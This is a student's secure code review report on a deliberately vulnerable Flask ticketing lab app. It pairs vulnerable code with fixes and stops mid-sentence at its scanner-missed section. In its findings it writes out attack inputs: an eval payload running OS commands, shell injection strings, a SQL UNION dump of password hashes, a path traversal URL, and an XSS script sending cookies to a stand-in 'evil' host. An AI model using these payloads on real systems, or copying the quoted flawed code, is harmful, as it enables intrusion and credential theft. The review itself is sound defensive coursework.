# Secure Code Review Report
## Scaler Support Desk Assignment

---

### Student Information

| Field | Details |
|---|---|
| Student Name | Aatmik Panse |
| Roll Number | 23BCS10082 |
| Batch / Section | 2027 Batch |
| Email ID | aatmik.23bcs10082@sst.scaler.com |
| Static Analysis Tool Used | Semgrep v1.168.0 (community rule packs: `p/python`, `p/flask`, `p/secrets`, `p/command-injection`, `p/sql-injection`) + manual code review |
| Review Date | 2026-06-27 |

---

## 1. Executive Summary

The Scaler Support Desk application is a deliberately vulnerable Flask (Python) web application that
provides a help-desk style ticketing system: users authenticate, view and search their tickets,
post comments, upload and download attachments, escalate tickets, and (for administrators) view a
global reports page. A small set of diagnostic endpoints (`/diagnostics/ping`) is also exposed.

A combined **SAST + manual secure code review** was performed against the entire source tree. The
automated Semgrep scan surfaced **15 raw findings** clustered around a handful of high-signal sinks
(`eval`, `os.popen`, MD5, `debug=True`, raw HTML responses). Manual review then validated each tool
result, removed duplicates/noise, and — critically — uncovered a number of serious issues that the
scanner is structurally unable to detect, such as SQL injection built through Python string
operations, broken access control / IDOR, path traversal, a stored XSS sink hidden behind a Jinja
`|safe` filter, an insecure file upload, and a TOCTOU race condition.

This report documents **15 confirmed True-Positive vulnerabilities** with real file paths and line
numbers, followed by a dedicated **False Negatives** section listing **4 real vulnerabilities the
scanner missed** but manual review caught, with an explanation of *why* each was missed. The
application contains multiple **Critical** issues that allow remote code execution, authentication
bypass, and full data compromise; it must not be deployed in any environment exposed to untrusted
users without remediation.

### Findings Summary (by severity)

| Severity | Count |
|---|---|
| Critical | 4 |
| High | 6 |
| Medium | 4 |
| Low | 1 |
| **Total confirmed findings** | **15** |
| False negatives (scanner-missed, manual) | 4 |

### Findings Index

| ID | Title | Severity | CWE | File:Line |
|---|---|---|---|---|
| F-01 | Remote Code Execution via `eval()` in SLA-score endpoint | Critical | CWE-95 | app.py:162–167 |
| F-02 | OS Command Injection in `/diagnostics/ping` | Critical | CWE-78 | app.py:190–192 |
| F-03 | SQL Injection in ticket search | Critical | CWE-89 | models.py:115–120 |
| F-04 | Broken Access Control on Admin Reports (missing role check) | Critical | CWE-862 | app.py:207–213 |
| F-05 | Stored Cross-Site Scripting in ticket comments (`\|safe`) | High | CWE-79 | templates/ticket.html:35 ; app.py:105–112 |
| F-06 | Path Traversal / Arbitrary File Read in attachment download | High | CWE-22 | app.py:115–123 |
| F-07 | IDOR – any user can read any ticket and its comments | High | CWE-639 | app.py:93–102 |
| F-08 | Hardcoded Flask `SECRET_KEY` (session forgery) | High | CWE-798 | app.py:20 |
| F-09 | Reflected XSS in diagnostics output | High | CWE-79 | app.py:192, 204 |
| F-10 | Insecure File Upload – arbitrary filename & type | High | CWE-434 | app.py:137–154 |
| F-11 | Weak Password Hashing with unsalted MD5 | Medium | CWE-916 | utils.py:6–11 |
| F-12 | Flask Debug Mode enabled in production (`debug=True`) | Medium | CWE-489 | app.py:220 |
| F-13 | Second-order SQL Injection in `tickets_by_status` (string `.format`) | Medium | CWE-89 | models.py:130–138 |
| F-14 | Hardcoded demo bypass token / authentication bypass | Medium | CWE-798 | app.py:25, 48–62 |
| F-15 | Verbose Error Message disclosure in SLA endpoint | Low | CWE-209 | app.py:163–166 |

---

## 2. Scope

| Item | Detail |
|---|---|
| Application | Scaler Support Desk (deliberately vulnerable lab app) |
| Language / Runtime | Python 3, Flask 3.0.3 |
| Architecture | Monolithic Flask app, server-rendered Jinja2 templates, SQLite backend |
| Source files reviewed | `app.py`, `models.py`, `utils.py`, `requirements.txt`, `templates/*.html`, `static/style.css`, supporting data files |
| Review type | White-box / source code review (SAST-assisted + manual) |
| Out of scope | Third-party library internals (Flask/Werkzeug), infrastructure, deployment configuration |

Reviewed source tree:

```
app.py                  # Flask routes / controllers
models.py               # SQLite data-access layer
utils.py                # password hashing, IP validation, path helpers
requirements.txt        # Flask==3.0.3
templates/
  base.html  login.html  dashboard.html  ticket.html  admin.html
static/style.css
attachments/boot_log.txt
internal_notes.txt
```

## 3. Methodology

1. **Inventory & comprehension.** Unzipped `supportdesk-app.zip` and read every source file to map
   routes, trust boundaries (authenticated vs. unauthenticated, user vs. admin), data flow from
   request inputs (`request.args`, `request.form`, `request.files`, URL path params) into sinks
   (SQL, shell, filesystem, HTML, `eval`).
2. **Automated SAST.** Ran Semgrep v1.168.0 with the community security rule packs:
   ```
   semgrep scan --config p/python --config p/flask --config p/secrets \
                --config p/command-injection --config p/sql-injection .
   ```
   The raw output is included in this folder as `semgrep_output.txt` / `semgrep_output.json`
   (15 raw results). *(Note: `--config auto` requires Semgrep metrics/telemetry to be enabled to
   reach the registry; the equivalent curated security packs above were used instead so the scan
   could run with telemetry disabled. The rule coverage is equivalent for this codebase.)*
3. **Validation.** Every Semgrep result was manually reviewed against the source to confirm the
   data flow was real and reachable (True Positive) and to discard duplicates / non-exploitable
   noise.
4. **Manual deep review.** Performed a line-by-line manual review focused on classes Semgrep is
   known to miss in this codebase: business-logic access control, IDOR, multi-step/second-order
   data flows, template-level XSS sinks, and concurrency. These produced the False Negatives in
   Section 5.
5. **Severity rating.** Each finding was rated **Critical / High / Medium / Low** based on
   exploitability and impact (RCE, auth bypass, and full-data-compromise issues rated Critical/High).

---

# 4. Detailed Findings (15 True Positives)

---

## Finding F-01 — Remote Code Execution via `eval()` in SLA-score endpoint

| Field | Details |
|---|---|
| Vulnerability Title | Remote Code Execution via `eval()` of user input |
| Classification | **True Positive** |
| File Name | `app.py` |
| Function Name | `sla_score()` |
| Vulnerable Line Number(s) | 162–167 |
| CWE | CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (`Eval Injection`) — https://cwe.mitre.org/data/definitions/95.html |
| Severity | **Critical** |
| Detected by | Semgrep (`python.lang.security.audit.eval-detected` / `user-eval`, line 162 & 164) + manual |

**Vulnerable code**
```python
162    formula = request.args.get("formula", "1+1")
163    try:
164        score = eval(formula)               # <-- attacker-controlled string passed to eval()
165    except Exception as exc:
166        return jsonify({"error": str(exc)}), 400
167    return jsonify({"formula": formula, "score": score})
```

**Why is it Vulnerable?**
The `formula` query parameter is taken directly from the HTTP request and passed to Python's
built-in `eval()` with no sanitization or sandboxing. `eval()` executes *any* Python expression,
not just arithmetic. An attacker can request, for example:
`/tickets/sla-score?formula=__import__('os').popen('id').read()` to run arbitrary OS commands as the
web-server process. This is a classic eval-injection True Positive — the source (request arg) reaches
the dangerous sink (`eval`) on the same line with no filtering.

**Security Impact**
- **Remote Code Execution** on the server (full host compromise, lateral movement, data exfiltration).
- The endpoint only requires a valid session, and the login page publishes test credentials, so the
  barrier to exploitation is effectively nil.

**Recommended Remediation**
Never `eval()` untrusted input. For arithmetic, use a safe expression evaluator or restrict to a
numeric parser:
```python
import ast, operator

_OPS = {ast.Add: operator.add, ast.Sub: operator.sub,
        ast.Mult: operator.mul, ast.Div: operator.truediv}

def _safe_eval(node):
    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
        return node.value
    if isinstance(node, ast.BinOp) and type(node.op) in _OPS:
        return _OPS[type(node.op)](_safe_eval(node.left), _safe_eval(node.right))
    raise ValueError("unsupported expression")

formula = request.args.get("formula", "1+1")
try:
    score = _safe_eval(ast.parse(formula, mode="eval").body)
except Exception:
    return jsonify({"error": "invalid formula"}), 400
```

**References:** OWASP Code Injection; CWE-95; CWE-94.

---

## Finding F-02 — OS Command Injection in `/diagnostics/ping`

| Field | Details |
|---|---|
| Vulnerability Title | OS Command Injection via unsanitized `host` parameter |
| Classification | **True Positive** |
| File Name | `app.py` |
| Function Name | `ping()` |
| Vulnerable Line Number(s) | 190–192 |
| CWE | CWE-78: OS Command Injection — https://cwe.mitre.org/data/definitions/78.html |
| Severity | **Critical** |
| Detected by | Semgrep (`dangerous-system-call`, line 191) + manual |

**Vulnerable code**
```python
190    host = request.args.get("host", "127.0.0.1")
191    output = os.popen("ping -n 1 " + host).read()   # <-- string-concatenated into a shell command
192    return "<pre>" + output + "</pre>"
```

**Why is it Vulnerable?**
The `host` parameter is concatenated directly into a shell command string passed to `os.popen()`,
which executes through `/bin/sh`. Shell metacharacters are not stripped, so an attacker can chain
commands. Requesting `/diagnostics/ping?host=127.0.0.1;id` (or `host=127.0.0.1%26%26whoami`) causes
the shell to execute the injected command. True Positive: tainted request data reaches a shell sink.

**Security Impact**
- **Remote Code Execution** / full server compromise, identical blast radius to F-01.
- The sibling endpoint `/diagnostics/ping-internal` (line 195) attempts a fix via `is_valid_ip()`,
  proving the developers knew the risk but left this endpoint unprotected.

**Recommended Remediation**
Avoid the shell entirely; pass arguments as a list and validate input:
```python
import subprocess
from utils import is_valid_ip

host = request.args.get("host", "127.0.0.1")
if not is_valid_ip(host):
    return jsonify({"error": "host must be a literal IP address"}), 400
output = subprocess.run(["ping", "-n", "1", host],
                        capture_output=True, text=True, timeout=5).stdout
```
`subprocess.run` with a list and no `shell=True` removes shell interpretation; the IP allow-list
prevents abuse.

**References:** OWASP Command Injection; CWE-78.

---

## Finding F-03 — SQL Injection in ticket search

| Field | Details |
|---|---|
| Vulnerability Title | SQL Injection via string-concatenated `LIKE` query |
| Classification | **True Positive** |
| File Name | `models.py` (reached from `app.py` `search()` route, lines 71–78) |
| Function Name | `search_tickets()` |
| Vulnerable Line Number(s) | 115–120 |
| CWE | CWE-89: SQL Injection — https://cwe.mitre.org/data/definitions/89.html |
| Severity | **Critical** |
| Detected by | Manual review (not flagged by Semgrep — see False Negative FN-1) |

**Vulnerable code**
```python
115    def search_tickets(term):
116        conn = get_connection()
117        sql = "SELECT * FROM tickets WHERE subject LIKE '%" + term + "%'"   # concatenated user input
118        rows = conn.execute(sql).fetchall()
119        conn.close()
120        return rows
```
Source (`app.py:76–77`):
```python
76    term = request.args.get("q", "")
77    results = models.search_tickets(term)
```

**Why is it Vulnerable?**
The `q` request parameter flows unmodified into `search_tickets()` and is concatenated into a raw SQL
string. A request such as `/tickets/search?q=' UNION SELECT id,username,password_hash,role,1,1 FROM
users--` breaks out of the `LIKE` clause and returns arbitrary data (including password hashes) from
any table. True Positive: classic injection — string building instead of parameterization.

**Security Impact**
- **Confidentiality:** dump the entire database (all tickets, usernames, password hashes).
- **Integrity:** stacked/boolean payloads can be used to infer or, depending on driver behaviour,
  modify data.
- Combined with the unsalted MD5 hashes (F-11), exfiltrated hashes are trivially cracked, leading to
  full account takeover.

**Recommended Remediation**
Use a parameterized query and let the driver handle escaping:
```python
def search_tickets(term):
    conn = get_connection()
    rows = conn.execute(
        "SELECT * FROM tickets WHERE subject LIKE ?", ("%" + term + "%",)
    ).fetchall()
    conn.close()
    return rows
```

**References:** OWASP SQL Injection; CWE-89.

---

## Finding F-04 — Broken Access Control on Admin Reports (missing role check)

| Field | Details |
|---|---|
| Vulnerability Title | Broken Access Control / Missing Authorization on `/admin/reports` |
| Classification | **True Positive** |
| File Name | `app.py` |
| Function Name | `admin_reports()` |
| Vulnerable Line Number(s) | 207–213 |
| CWE | CWE-862: Missing Authorization — https://cwe.mitre.org/data/definitions/862.html |
| Severity | **Critical** |
| Detected by | Manual review (not flagged by Semgrep — see False Negative FN-2) |

**Vulnerable code**
```python
207    @app.route("/admin/reports")
208    def admin_reports():
209        user = current_user()
210        if not user:
211            return redirect(url_for("login"))
212        tickets = models.all_tickets()        # returns EVERY ticket + owner usernames
213        return render_template("admin.html", user=user, tickets=tickets)
```

**Why is it Vulnerable?**
The route only checks that the requester is *authenticated* (`current_user()`); it never checks that
`user["role"] == "admin"`. Any logged-in low-privilege user (e.g. `alice`) can directly navigate to
`/admin/reports` and view *all* tickets across *all* users together with their owner usernames. The
admin link is merely hidden in the template (`base.html:17` `{% if user.role == 'admin' %}`), which is
client-side concealment, not enforcement. True Positive: authorization is missing on a privileged
function (forced browsing).

**Security Impact**
- **Privilege Escalation / Information Disclosure:** horizontal and vertical access to data belonging
  to other tenants/users without authorization.

**Recommended Remediation**
Enforce the role server-side, ideally via a reusable decorator:
```python
from functools import wraps
def admin_required(f):
    @wraps(f)
    def wrapper(*a, **kw):
        user = current_user()
        if not user:
            return redirect(url_for("login"))
        if user["role"] != "admin":
            abort(403)
        return f(*a, **kw)
    return wrapper

@app.route("/admin/reports")
@admin_required
def admin_reports():
    ...
```

**References:** OWASP A01:2021 Broken Access Control; CWE-862; CWE-285.

---

## Finding F-05 — Stored Cross-Site Scripting in ticket comments (`|safe`)

| Field | Details |
|---|---|
| Vulnerability Title | Stored XSS via Jinja `|safe` on comment body |
| Classification | **True Positive** |
| File Name | `templates/ticket.html` (sink) ; `app.py` `post_comment()` (source) |
| Function Name | `post_comment()` |
| Vulnerable Line Number(s) | `templates/ticket.html`:35 ; `app.py`:105–112 |
| CWE | CWE-79: Cross-Site Scripting — https://cwe.mitre.org/data/definitions/79.html |
| Severity | **High** |
| Detected by | Manual review (not flagged by Semgrep — see False Negative FN-3) |

**Vulnerable code**
`templates/ticket.html`:
```html
34      <div class="comment">
35        <span class="comment-author">{{ c.author }}</span>{{ c.body|safe }}   <!-- |safe disables escaping -->
36      </div>
```
`app.py` (source / storage):
```python
110    body = request.form.get("body", "")
111    models.add_comment(ticket_id, user["username"], body)   # stored verbatim
```

**Why is it Vulnerable?**
Jinja2 auto-escapes by default, but the `|safe` filter explicitly disables escaping for the comment
body. The comment body is fully attacker-controlled (`request.form["body"]`) and is stored unmodified
in the database. When the ticket is viewed, the raw HTML/JS is rendered into the page. Posting a
comment of `<script>fetch('//evil/'+document.cookie)</script>` results in stored XSS that fires for
every viewer of the ticket. True Positive: untrusted stored data rendered without encoding.

**Security Impact**
- **Stored/persistent XSS:** session/cookie theft, account takeover, CSRF-style actions performed in
  the victim's session, defacement. Because tickets are viewable across users (see F-07), an attacker
  can target administrators viewing the ticket.

**Recommended Remediation**
Remove the `|safe` filter so Jinja auto-escaping applies:
```html
<span class="comment-author">{{ c.author }}</span>{{ c.body }}
```
If limited formatting is genuinely required, render Markdown and sanitize the resulting HTML with an
allow-list library (e.g. `bleach`) before marking it safe.

**References:** OWASP XSS Prevention Cheat Sheet; CWE-79.

---

## Finding F-06 — Path Traversal / Arbitrary File Read in attachment download

| Field | Details |
|---|---|
| Vulnerability Title | Path Traversal in attachment download |
| Classification | **True Positive** |
| File Name | `app.py` |
| Function Name | `download_attachment()` |
| Vulnerable Line Number(s) | 115–123 |
| CWE | CWE-22: Improper Limitation of a Pathname to a Restricted Directory — https://cwe.mitre.org/data/definitions/22.html |
| Severity | **High** |
| Detected by | Manual review |

**Vulnerable code**
```python
115    @app.route("/tickets/<int:ticket_id>/attachments/<path:filename>")
116    def download_attachment(ticket_id, filename):
...
120        target = ATTACHMENTS_DIR + "/" + filename      # filename not constrained to the directory
121        if not os.path.exists(target):
122            return "File not found", 404
123        return send_file(target)
```

**Why is it Vulnerable?**
The `<path:filename>` converter intentionally allows slashes, and `filename` is concatenated onto the
attachments directory with no canonicalization or containment check. A request such as
`/tickets/2/attachments/../../app.py` (or an absolute path / `..%2f..%2f` sequences) escapes the
`attachments/` directory and reads arbitrary files such as the SQLite database, source code, or OS
files. Notably, the *sibling* endpoint `preview_attachment()` (line 126) correctly uses
`resolve_within()` to contain the path — proving the safe pattern exists in the codebase but was not
applied here. True Positive.

**Security Impact**
- **Arbitrary File Read / Information Disclosure:** exfiltration of source code, `supportdesk.db`
  (all credentials), `internal_notes.txt`, and system files — which in turn enables further attacks
  (e.g. cracking the dumped MD5 hashes).

**Recommended Remediation**
Reuse the existing containment helper (and reject traversal):
```python
target = resolve_within(ATTACHMENTS_DIR, filename)
if target is None or not target.exists():
    abort(404)
return send_file(target)
```
Or use Flask's `send_from_directory(ATTACHMENTS_DIR, filename)`, which rejects traversal.

**References:** OWASP Path Traversal; CWE-22.

---

## Finding F-07 — IDOR: any user can read any ticket and its comments

| Field | Details |
|---|---|
| Vulnerability Title | Insecure Direct Object Reference (IDOR) on ticket view |
| Classification | **True Positive** |
| File Name | `app.py` |
| Function Name | `view_ticket()` / `post_comment()` |
| Vulnerable Line Number(s) | 93–102 (and 105–112) |
| CWE | CWE-639: Authorization Bypass Through User-Controlled Key — https://cwe.mitre.org/data/definitions/639.html |
| Severity | **High** |
| Detected by | Manual review |

**Vulnerable code**
```python
93     @app.route("/tickets/<int:ticket_id>")
94     def view_ticket(ticket_id):
95         user = current_user()
96         if not user:
97             return redirect(url_for("login"))
98         ticket = models.get_ticket(ticket_id)     # fetched by ID only — no owner check
99         if not ticket:
100            return "Ticket not found", 404
101        comments = models.get_comments(ticket_id)
102        return render_template("ticket.html", user=user, ticket=ticket, comments=comments)
```

**Why is it Vulnerable?**
`get_ticket(ticket_id)` looks the ticket up purely by the URL-supplied `ticket_id`; it never verifies
that `ticket["owner_id"] == user["id"]`. The dashboard scopes tickets per user
(`list_tickets_for_user`), but the detail route does not enforce ownership, so any authenticated user
can enumerate `/tickets/1`, `/tickets/2`, … and read tickets (and comments, and trigger
escalation/comment actions) belonging to other users. True Positive: object-level authorization is
missing. The same flaw applies to `post_comment`, `upload_attachment`, and `escalate`.

**Security Impact**
- **Horizontal privilege escalation / Information Disclosure:** read and act on other users' support
  tickets, which often contain sensitive personal or operational data.

**Recommended Remediation**
Enforce ownership (or admin role) on every object-scoped route:
```python
ticket = models.get_ticket(ticket_id)
if not ticket or (ticket["owner_id"] != user["id"] and user["role"] != "admin"):
    abort(404)   # 404 to avoid confirming existence
```

**References:** OWASP A01:2021 Broken Access Control; CWE-639; CWE-285.

---

## Finding F-08 — Hardcoded Flask `SECRET_KEY` (session forgery)

| Field | Details |
|---|---|
| Vulnerability Title | Hardcoded Flask session secret key |
| Classification | **True Positive** |
| File Name | `app.py` |
| Function Name | module scope (app config) |
| Vulnerable Line Number(s) | 20 |
| CWE | CWE-798: Use of Hard-coded Credentials — https://cwe.mitre.org/data/definitions/798.html |
| Severity | **High** |
| Detected by | Manual review (assisted by Semgrep `p/secrets`) |

**Vulnerable code**
```python
20    app.config["SECRET_KEY"] = "sd-prod-7f1a9c3e2b"
```

**Why is it Vulnerable?**
Flask signs the client-side session cookie with `SECRET_KEY`. Hardcoding it in source means anyone
with read access to the repository (or who extracts it via the path-traversal/source-disclosure in
F-06) knows the signing key. With the key, an attacker can forge a session cookie with any
`user_id`/`role`, e.g. `{"user_id": 3, "role": "admin"}`, granting full **authentication and
authorization bypass**. True Positive: a static, predictable, committed secret used for an integrity
control.

**Security Impact**
- **Authentication Bypass / Privilege Escalation:** forge arbitrary authenticated/admin sessions
  without credentials.

**Recommended Remediation**
Load the secret from the environment (or a secrets manager) and fail closed if absent:
```python
import os
secret = os.environ.get("SUPPORTDESK_SECRET_KEY")
if not secret:
    raise RuntimeError("SUPPORTDESK_SECRET_KEY must be set")
app.config["SECRET_KEY"] = secret
```
Generate a high-entropy key (`secrets.token_hex(32)`), never commit it, and rotate it.

**References:** OWASP A02:2021/A07; CWE-798; Flask session security docs.

---

## Finding F-09 — Reflected XSS in diagnostics output

| Field | Details |
|---|---|
| Vulnerability Title | Reflected Cross-Site Scripting in ping output |
| Classification | **True Positive** |
| File Name | `app.py` |
| Function Name | `ping()` / `ping_internal()` |
| Vulnerable Line Number(s) | 192, 204 |
| CWE | CWE-79: Cross-Site Scripting — https://cwe.mitre.org/data/definitions/79.html |
| Severity | **High** |
| Detected by | Semgrep (`raw-html-format` / `directly-returned-format-string`, lines 192 & 204) + manual |

**Vulnerable code**
```python
191    output = os.popen("ping -n 1 " + host).read()
192    return "<pre>" + output + "</pre>"    # raw string returned as HTML, no escaping
```

**Why is it Vulnerable?**
The handler builds an HTML response by string-concatenating command output (which itself reflects the
attacker-controlled `host` value and any injected content) and returns it directly. Because the
response bypasses Jinja2 auto-escaping, any HTML/JS contained in or derived from the input is rendered
by the browser. Even on `ping_internal` (line 204), error text reflecting input can carry markup. The
output is returned as `text/html`, so script executes. True Positive (reflected XSS); F-02 covers the
co-located command-injection.

**Security Impact**
- **Reflected XSS:** script execution in the victim's browser, session theft, phishing.

**Recommended Remediation**
Do not build raw HTML from dynamic data. Escape and/or set a non-HTML content type:
```python
from markupsafe import escape
from flask import Response
return Response("<pre>" + str(escape(output)) + "</pre>", mimetype="text/html")
# or return the plain text:  Response(output, mimetype="text/plain")
```

**References:** OWASP XSS Prevention; CWE-79.

---

## Finding F-10 — Insecure File Upload (arbitrary filename & content type)

| Field | Details |
|---|---|
| Vulnerability Title | Unrestricted File Upload |
| Classification | **True Positive** |
| File Name | `app.py` |
| Function Name | `upload_attachment()` |
| Vulnerable Line Number(s) | 137–154 |
| CWE | CWE-434: Unrestricted Upload of File with Dangerous Type — https://cwe.mitre.org/data/definitions/434.html |
| Severity | **High** |
| Detected by | Manual review |

**Vulnerable code**
```python
142    uploaded = request.files.get("file")
...
150    save_path = os.path.join(ATTACHMENTS_DIR, uploaded.filename)   # raw, attacker-chosen name
151    with open(save_path, "wb") as f:
152        f.write(data)
153    models.add_attachment(ticket_id, uploaded.filename, fingerprint)
```

**Why is it Vulnerable?**
The uploaded file's `filename` is used directly to build the save path with no `secure_filename()`
call, no extension allow-list, and no content-type/size validation. Two distinct problems:
1. **Path traversal on write** — a filename like `../templates/base.html` or `../app.py` lets the
   attacker overwrite application files (or write outside the directory).
2. **Dangerous content** — arbitrary files (HTML with script, SVG, `.py`, etc.) can be stored and
   later served back via the download endpoint, enabling stored XSS / content-spoofing, and combined
   with traversal can lead to code execution if the path lands somewhere executed/served.
True Positive: upload sink with no filename sanitization or type control.

**Security Impact**
- **Arbitrary file write / overwrite, stored XSS, potential RCE** depending on where files land and
  how they are served.

**Recommended Remediation**
```python
from werkzeug.utils import secure_filename
ALLOWED = {"txt", "log", "png", "jpg", "pdf"}

name = secure_filename(uploaded.filename or "")
ext = name.rsplit(".", 1)[-1].lower() if "." in name else ""
if not name or ext not in ALLOWED:
    return jsonify({"error": "file type not allowed"}), 400
if len(data) > 5 * 1024 * 1024:
    return jsonify({"error": "file too large"}), 400
save_path = os.path.join(ATTACHMENTS_DIR, name)
```
Also serve attachments with `Content-Disposition: attachment` and a benign content type.

**References:** OWASP File Upload Cheat Sheet; CWE-434.

---

## Finding F-11 — Weak Password Hashing with unsalted MD5

| Field | Details |
|---|---|
| Vulnerability Title | Use of insecure/unsalted MD5 for password storage |
| Classification | **True Positive** |
| File Name | `utils.py` |
| Function Name | `hash_password()` / `verify_password()` |
| Vulnerable Line Number(s) | 6–11 (sink at line 7) |
| CWE | CWE-916: Use of Password Hash With Insufficient Computational Effort — https://cwe.mitre.org/data/definitions/916.html (also CWE-327) |
| Severity | **Medium** |
| Detected by | Semgrep (`insecure-hash-algorithm-md5`, `md5-used-as-password`, line 7) + manual |

**Vulnerable code**
```python
6     def hash_password(password):
7         return hashlib.md5(password.encode()).hexdigest()    # fast, unsalted, broken hash
8
10    def verify_password(password, password_hash):
11        return hash_password(password) == password_hash
```

**Why is it Vulnerable?**
Passwords are hashed with a single round of unsalted MD5. MD5 is extremely fast and broken for
cryptographic use: hashes can be reversed at billions/sec on commodity GPUs, and identical passwords
produce identical hashes (no salt) enabling rainbow-table and pattern attacks. If the user table is
disclosed (via F-03 SQLi or F-06 path traversal), every password is recovered almost instantly. True
Positive: wrong primitive for password storage.

**Security Impact**
- **Mass credential compromise / account takeover** following any database disclosure.

**Recommended Remediation**
Use a slow, salted, memory-hard password hash (Argon2id, scrypt, or bcrypt):
```python
from argon2 import PasswordHasher
_ph = PasswordHasher()

def hash_password(password):
    return _ph.hash(password)

def verify_password(password, password_hash):
    try:
        return _ph.verify(password_hash, password)
    except Exception:
        return False
```

**References:** OWASP Password Storage Cheat Sheet; CWE-916; CWE-327.

---

## Finding F-12 — Flask Debug Mode enabled (`debug=True`)

| Field | Details |
|---|---|
| Vulnerability Title | Werkzeug debugger / debug mode enabled in production |
| Classification | **True Positive** |
| File Name | `app.py` |
| Function Name | `__main__` block |
| Vulnerable Line Number(s) | 220 |
| CWE | CWE-489: Active Debug Code — https://cwe.mitre.org/data/definitions/489.html (also CWE-94 via console) |
| Severity | **Medium** |
| Detected by | Semgrep (`debug-enabled`, `avoid_app_run_with_bad_host`, line 220) + manual |

**Vulnerable code**
```python
220    app.run(debug=True, host="0.0.0.0", port=5050)
```

**Why is it Vulnerable?**
`debug=True` enables the interactive Werkzeug debugger, which renders full stack traces with source
and local variables on any unhandled exception, and exposes an in-browser Python console (PIN-gated,
but the PIN is derivable from information often leaked by the same debugger / file disclosure). Bound
to `0.0.0.0`, the app is reachable on all interfaces. This leaks sensitive internals and can lead to
**remote code execution** via the debugger console. True Positive.

**Security Impact**
- **Information Disclosure** (source, environment, secrets) and potential **RCE** via the debug
  console; broad network exposure via `0.0.0.0`.

**Recommended Remediation**
Disable debug in production and drive it from configuration; bind to localhost / a real WSGI server:
```python
debug = os.environ.get("SUPPORTDESK_ENV") != "production"
app.run(debug=debug, host="127.0.0.1", port=5050)
```
Deploy behind a production WSGI server (gunicorn/uWSGI) with debug off.

**References:** CWE-489; Flask deployment docs.

---

## Finding F-13 — Second-order SQL Injection in `tickets_by_status` (string `.format`)

| Field | Details |
|---|---|
| Vulnerability Title | SQL Injection via `str.format` in status filter |
| Classification | **True Positive** |
| File Name | `models.py` |
| Function Name | `tickets_by_status()` |
| Vulnerable Line Number(s) | 130–138 (sink at line 135) |
| CWE | CWE-89: SQL Injection — https://cwe.mitre.org/data/definitions/89.html |
| Severity | **Medium** |
| Detected by | Manual review |

**Vulnerable code**
```python
123    STATUS_COLUMNS = {"open": "open", "closed": "closed", "pending": "pending"}
...
130    def tickets_by_status(status):
131        column = STATUS_COLUMNS.get(status)
132        if column is None:
133            return None
134        conn = get_connection()
135        sql = "SELECT * FROM tickets WHERE status = '{}'".format(column)   # format-built SQL
136        rows = conn.execute(sql).fetchall()
```

**Why is it Vulnerable?**
The query is assembled with `str.format()` instead of parameter binding. In the *current* code the
value passes through an allow-list dictionary, so it is not exploitable today (this is why it is
rated Medium and not Critical). However, it is a **latent / second-order SQL injection**: the unsafe
string-formatting pattern is the actual defect. The allow-list is a fragile, easily-broken control —
any future change that adds a key, loosens the lookup, or reuses this builder for another column
re-opens injection. The construction pattern itself is the True-Positive finding; the dangerous sink
exists and is one refactor away from being directly exploitable.

**Security Impact**
- **Latent SQL Injection** — full database read/modify if the upstream allow-list is ever weakened or
  bypassed. Documents an anti-pattern that must be corrected at the data layer.

**Recommended Remediation**
Bind the value as a parameter regardless of the allow-list:
```python
def tickets_by_status(status):
    if status not in STATUS_COLUMNS:
        return None
    conn = get_connection()
    rows = conn.execute("SELECT * FROM tickets WHERE status = ?", (status,)).fetchall()
    conn.close()
    return rows
```

**References:** OWASP SQL Injection; CWE-89.

---

## Finding F-14 — Hardcoded demo bypass token / authentication bypass path

| Field | Details |
|---|---|
| Vulnerability Title | Hardcoded "demo" token enabling sandbox-account bypass |
| Classification | **True Positive** |
| File Name | `app.py` |
| Function Name | module scope + `login()` / `enable_sandbox_account()` |
| Vulnerable Line Number(s) | 25, 28–30, 48–52 |
| CWE | CWE-798: Use of Hard-coded Credentials — https://cwe.mitre.org/data/definitions/798.html (also CWE-489 backdoor) |
| Severity | **Medium** |
| Detected by | Semgrep (`p/secrets`) + manual |

**Vulnerable code**
```python
25    ANALYTICS_DEMO_TOKEN = "demo-sandbox-9f3a21"
...
28    def enable_sandbox_account(token):
29        session["sandbox_token"] = token
30        session["sandbox_mode"] = True
...
51        if app.config["ENV_MODE"] == "demo" and request.args.get("token") == ANALYTICS_DEMO_TOKEN:
52            enable_sandbox_account(ANALYTICS_DEMO_TOKEN)
```

**Why is it Vulnerable?**
A static, committed secret token (`demo-sandbox-9f3a21`) gates a special "sandbox" code path on the
login route. The token is hardcoded in source and the value is therefore known to anyone with code or
source-disclosure access (see F-06). The gate is guarded by `ENV_MODE == "demo"`, but `ENV_MODE` is
read from an environment variable, so a misconfiguration / demo deployment turns this into a
pre-authentication state-setting backdoor activated purely by a URL query string. Shipping hardcoded
backdoor/demo tokens in production code is a True-Positive secrets-management defect.

**Security Impact**
- **Authentication-flow tampering / backdoor:** in any environment where `ENV_MODE=demo`, an attacker
  who knows (or extracts) the token can flip session state before authentication. Even when inert, it
  is a hardcoded secret that should never ship.

**Recommended Remediation**
- Remove demo/sandbox backdoors from production code entirely; gate such features behind separate,
  non-production builds.
- If a demo path is required, source the token from a secret store, make it high-entropy and
  per-deployment, and never commit it.

**References:** CWE-798; CWE-489; OWASP A07:2021.

---

## Finding F-15 — Verbose Error Message disclosure in SLA endpoint

| Field | Details |
|---|---|
| Vulnerability Title | Information Disclosure via exception message reflected to client |
| Classification | **True Positive** |
| File Name | `app.py` |
| Function Name | `sla_score()` |
| Vulnerable Line Number(s) | 163–166 |
| CWE | CWE-209: Generation of Error Message Containing Sensitive Information — https://cwe.mitre.org/data/definitions/209.html |
| Severity | **Low** |
| Detected by | Manual review |

**Vulnerable code**
```python
163    try:
164        score = eval(formula)
165    except Exception as exc:
166        return jsonify({"error": str(exc)}), 400    # raw exception text returned to client
```

**Why is it Vulnerable?**
The raw exception text (`str(exc)`) is returned verbatim to the client. Internal error strings can
leak module names, attribute paths, type information, and the structure of server-side objects — and
here, because the input is fed to `eval`, the error messages double as an oracle that helps an
attacker craft working `eval`/injection payloads (F-01). True Positive: sensitive internal detail in
error responses.

**Security Impact**
- **Information Disclosure** that aids reconnaissance and exploitation of other findings (notably the
  RCE in F-01).

**Recommended Remediation**
Return a generic message to the client; log the detail server-side:
```python
import logging
except Exception:
    logging.exception("sla_score evaluation failed")
    return jsonify({"error": "invalid formula"}), 400
```

**References:** CWE-209; OWASP Improper Error Handling.

---

# 5. False Negatives — Vulnerabilities Missed by the Scanner (4)

These are **real, confirmed vulnerabilities present in the code that Semgrep did NOT report**, but
which manual review identified. For each, the table notes the root cause of the miss. (Several of
